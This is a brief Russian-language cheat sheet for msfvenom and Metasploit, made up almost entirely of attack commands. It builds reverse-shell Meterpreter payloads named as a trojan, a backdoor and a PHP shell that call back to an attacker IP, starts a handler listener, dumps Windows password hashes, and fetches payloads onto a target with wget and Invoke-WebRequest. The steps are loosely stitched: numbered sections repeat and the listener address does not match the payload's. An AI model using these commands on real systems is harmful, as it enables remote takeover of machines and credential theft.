MSFvenom - инструмент для создания полезных нагрузок (payloads), шелл-кодов и шифрования. Это как "фабрика эксплойтов".


1. Создаем payload

msfvenom -p <PAYLOAD> LHOST=<ВАШ_IP> LPORT=<ПОРТ> -f <ФОРМАТ> -o <ФАЙЛ>

# Простой бэкдор для Windows
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.2.3 LPORT=4444 -f exe -o trojan.exe

# Простой бэкдор для Linux
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.2.3 LPORT=4444 -f elf -o backdoor.elf

# PHP shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.2.3 LPORT=4444 -f raw -o shell.php

2. Запускаем слушатель (listener) в Metasploit
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.100
set LPORT 4444
run
3. Запускаем payload на целевой машине
4. Постэксплуатация (post-exploitation)
ctrl+z уходим в фоновый режим
use post/windows/gather/hashdump (модуль постэкспуалатции)

3. Запускаем payload на целевой машине
Linux:
wget http://192.168.129.191:8085/php.shell

Windows:
Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe

4. В Windows переключаемся на shell:
shell

